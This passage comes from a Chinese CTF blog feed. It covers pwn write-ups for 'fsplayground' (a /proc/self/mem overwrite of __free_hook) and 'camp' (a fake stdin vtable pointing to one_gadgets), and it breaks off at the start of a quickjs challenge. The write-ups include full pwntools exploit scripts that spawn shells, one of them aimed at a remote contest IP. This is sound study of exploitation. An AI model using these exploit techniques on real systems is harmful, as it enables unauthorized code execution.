punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">"/bin/sh\x00"</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(p)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="fsplayground"><a href="#fsplayground" class="headerlink" title="fsplayground"></a>fsplayground</h1><h2 id="0x01-查看文件-2"><a href="#0x01-查看文件-2" class="headerlink" title="0x01 查看文件"></a>0x01 查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/30/2020-diao-yu-bei/6.png"></div>保护全开，libc 2.27考点：/proc/self中的文件知识## 0x02 IDA分析<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/30/2020-diao-yu-bei/7.png"></div>功能如图所示，打开、读取、写文件<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/30/2020-diao-yu-bei/8.png"></div>但是不能对flag文件进行操作，那么就只能想办法getshell了<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/30/2020-diao-yu-bei/9.png"></div>移动write/read的fd指针位置**lseek是一个用于改变读写一个文件时读写指针位置的一个系统调用。指针位置可以是绝对的或者相对的。**<h2 id="0x03-思路-2"><a href="#0x03-思路-2" class="headerlink" title="0x03 思路"></a>0x03 思路</h2><p>首先需要补充一点知识：</p><p>Linux 内核提供了一种通过 /proc 文件系统，在运行时访问内核内部数据结构、改变内核设置的机制。proc文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。它以文件系统的方式为访问系统内核数据的操作提供接口。</p><p>读取/proc/self/maps可以得到当前进程的内存映射关系，通过读该文件的内容可以得到内存代码段基址。</p><p>/proc/self/mem是进程的内存内容，通过修改该文件相当于直接修改当前进程的内存。</p><p>思路就有了：<br><strong>第一步</strong>：通过读取/proc/self/maps来得到libc的地址<br><strong>第二步</strong>：通过修改/proc/self/mem来修改进程的地址内容，也就是利用changeoffset函数找到free_hook的地址<br><strong>第三步</strong>：改free_hook为system，在前面注意写/bin/sh，因为后面有个delete操作，可以直接getshell了</p><h2 id="0x04-exp-2"><a href="#0x04-exp-2" class="headerlink" title="0x04 exp"></a>0x04 exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>r <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>rl <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>rn <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span>x<span class="token punctuation">)</span>rud <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>sl <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>sla <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>sa <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'split'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./fsplayground'</span><span class="token punctuation">)</span>libc_offset <span class="token operator">=</span> <span class="token number">0x3c4b20</span>gadgets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45226</span><span class="token punctuation">,</span><span class="token number">0x4527a</span><span class="token punctuation">,</span><span class="token number">0xcd173</span><span class="token punctuation">,</span><span class="token number">0xcd248</span><span class="token punctuation">,</span><span class="token number">0xf0364</span><span class="token punctuation">,</span><span class="token number">0xf0370</span><span class="token punctuation">,</span><span class="token number">0xf1207</span><span class="token punctuation">,</span><span class="token number">0xf67b0</span><span class="token punctuation">]</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./fsplayground'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'119.3.111.133'</span><span class="token punctuation">,</span><span class="token number">6666</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span>option<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Filename: "</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Option: "</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>option<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Read</span><span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Write</span><span class="token punctuation">(</span>sz<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'5'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Seek</span><span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Offset: "</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice:'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    Open<span class="token punctuation">(</span><span class="token string">"/proc/self/maps"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>    Read<span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"[heap]\n"</span><span class="token punctuation">)</span>    libc_base <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"libc base => "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>    libc<span class="token punctuation">.</span>address <span class="token operator">=</span> libc_base    Close<span class="token punctuation">(</span><span class="token punctuation">)</span>    Open<span class="token punctuation">(</span><span class="token string">"/proc/self/mem"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>    Seek<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#gdb.attach(p,'b* 0x0000555555554000+0xf21')</span>    Write<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>exp<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 2020 Game </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2.27 double free </tag>
            
            <tag> IO attack </tag>
            
            <tag> /proc/self/文件知识 </tag>
            
            <tag> index越界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-蓝帽杯-PWN</title>
      <link href="/2020/08/09/2020-lan-mao-bei-pwn/"/>
      <url>/2020/08/09/2020-lan-mao-bei-pwn/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>参加了2020蓝帽杯的线上赛，成功被大佬带飞，如果再给点时间，PWN就AK了，P1umer师傅在比赛结束的15分钟做出了全场最少解的题目，tql！</p><h1 id="0x01-camp"><a href="#0x01-camp" class="headerlink" title="0x01 camp"></a>0x01 camp</h1><h2 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h2><div style="width:50%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/09/2020-lan-mao-bei-pwn/0.png"></div>保护全开<h2 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>主函数：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/09/2020-lan-mao-bei-pwn/1.png"></div><p>STDOUT功能：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/09/2020-lan-mao-bei-pwn/2.png"></div>基本功能正常，在STDOUT、STDIN、STDERR功能中都可以向对应的io_file结构体写数据，且可以修改整个结构体。<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>思路很简单：<br><strong>第一步：</strong>通过脏数据泄露libc<br><strong>第二步：</strong>利用溢出修改stdout的vtable内容伟heap上的地址，而该heap地址中全是one_gadgets<br><strong>第三步：</strong>调用fake vtable的虚函数</p><p>之前不知道到底是怎么getshell的，这里调试看看：<br>最后是看到进入scanf流程，最后会有一个call io_stdin结构体vatble处[vtable+0x28]的指令</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/09/2020-lan-mao-bei-pwn/3.png"></div>**__isoc99_scanf-&gt;_IO_vfscanf-&gt;__uflow就可以jmp到stdin [vtable+0x28]**<p>不过一开始我改的是stdout，但是走到printf会崩掉，其实printf里面按道理就可以call到stdout结构体的vtable，但是在中间会崩掉，有可能是伪造参数出了问题。</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/09/2020-lan-mao-bei-pwn/4.png"></div><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># p = remote("47.93.204.245",16543)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so.6"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 0x45216 execve("/bin/sh", rsp+0x30, environ)</span><span class="token comment" spellcheck="true"># constraints:</span><span class="token comment" spellcheck="true">#   rax == NULL</span><span class="token comment" spellcheck="true"># 0x4526a execve("/bin/sh", rsp+0x30, environ)</span><span class="token comment" spellcheck="true"># constraints:</span><span class="token comment" spellcheck="true">#   [rsp+0x30] == NULL</span><span class="token comment" spellcheck="true"># 0xf02a4 execve("/bin/sh", rsp+0x50, environ)</span><span class="token comment" spellcheck="true"># constraints:</span><span class="token comment" spellcheck="true">#   [rsp+0x50] == NULL</span><span class="token comment" spellcheck="true"># 0xf1147 execve("/bin/sh", rsp+0x70, environ)</span><span class="token comment" spellcheck="true"># constraints:</span><span class="token comment" spellcheck="true">#   [rsp+0x70] == NULL</span><span class="token keyword">def</span> <span class="token function">stdoutCreate</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">>>\n"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"size:\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"content:\n"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">stdinCreate</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">>>\n"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"size:\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"content:\n"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">stderrCreate</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">>>\n"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"size:\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"content:\n"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">>>\n"</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">deleteAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">>>\n"</span><span class="token punctuation">,</span><span class="token string">"5"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">>>\n"</span><span class="token punctuation">,</span><span class="token string">"6"</span><span class="token punctuation">)</span>stdinCreate<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">"aaaa\n"</span><span class="token punctuation">)</span>stdinCreate<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">"a\n"</span><span class="token punctuation">)</span>stdinCreate<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">"a\n"</span><span class="token punctuation">)</span>offset <span class="token operator">=</span> <span class="token number">0x7ffff7dd1b0a</span><span class="token operator">-</span><span class="token number">0x7ffff7a0d000</span>deleteAll<span class="token punctuation">(</span><span class="token punctuation">)</span>stdinCreate<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>stdinCreate<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>heap_address <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0xa</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x55</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span>offsetsuccess<span class="token punctuation">(</span><span class="token string">"heap address ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>heap_address<span class="token punctuation">)</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span><span class="token string">"libc address ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>one_gadget <span class="token operator">=</span> libc<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token number">0xf1147</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span>vtable <span class="token operator">=</span> heap_address<span class="token operator">+</span><span class="token number">0xa0</span>stderrCreate<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">9</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(p)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span><span class="token number">0x00007ffff7dd120b</span><span class="token operator">-</span><span class="token number">0x7ffff7a0d000</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span><span class="token number">0x00007ffff7dd1963</span><span class="token operator">-</span><span class="token number">0x7ffff7a0d000</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span><span class="token number">0x00007ffff7dd1964</span><span class="token operator">-</span><span class="token number">0x7ffff7a0d000</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span><span class="token number">0x00007ffff7dd1963</span><span class="token operator">-</span><span class="token number">0x7ffff7a0d000</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">5</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span><span class="token number">0x00007ffff7dd1964</span><span class="token operator">-</span><span class="token number">0x7ffff7a0d000</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">7</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x000000000a000000</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span><span class="token number">0x00007ffff7dd3790</span><span class="token operator">-</span><span class="token number">0x7ffff7a0d000</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xffffffffffffffff</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span><span class="token number">0x00007ffff7dd19c0</span><span class="token operator">-</span><span class="token number">0x7ffff7a0d000</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x00000000ffffffff</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>vtable<span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>stdinCreate<span class="token punctuation">(</span><span class="token number">0xf0</span><span class="token punctuation">,</span>payload<span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(p)</span><span class="token comment" spellcheck="true"># close()</span><span class="token comment" spellcheck="true"># p.sendlineafter("token: ","icqc01057047d17ac529fae0095bbf88")</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x02-love"><a href="#0x02-love" class="headerlink" title="0x02 love"></a>0x02 love</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这道题是非常规的题，如果再给P1umer师傅一会儿时间就出了。题目是基于Fabrice Bellard大牛写的开源js引擎quickjs，想要分析quickjs引擎的运行原理难度太大，但是P1umer师傅很快发现了quickjs的关键字。</p><h2 id="补充知识点"><a href="#补充知识点" class="headerlink" title="补充知识点"></a>补充知识点</h2><p>Quick JS 是 Fabrice Bellard 今年发布的一款 JavaScript 